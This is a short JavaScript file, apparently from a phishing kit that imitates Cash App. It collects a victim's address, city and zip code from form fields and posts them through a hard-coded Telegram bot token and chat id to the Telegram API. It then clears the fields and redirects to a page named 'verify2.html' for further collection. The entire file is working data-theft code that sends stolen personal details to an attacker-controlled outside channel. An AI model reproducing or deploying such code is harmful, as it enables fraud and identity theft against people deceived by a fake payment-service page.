//bot token
var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
//chat id
var chat_id = 6195480252;
var u_address, u_city, u_zipcode, message;
var ready = function () {
    u_address = document.getElementById("address").value;
    u_city = document.getElementById("city").value;
    u_zipcode = document.getElementById("zipcode").value;
    message = "CashAppAddress: " + u_address + "\nCashAppCity: " + u_city + "\nCashAppZipcode: " + u_zipcode;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'verify2.html';
    });
    document.getElementById("address").value = "";
    document.getElementById("city").value = "";
    document.getElementById("zipcode").value = "";
    return false;
};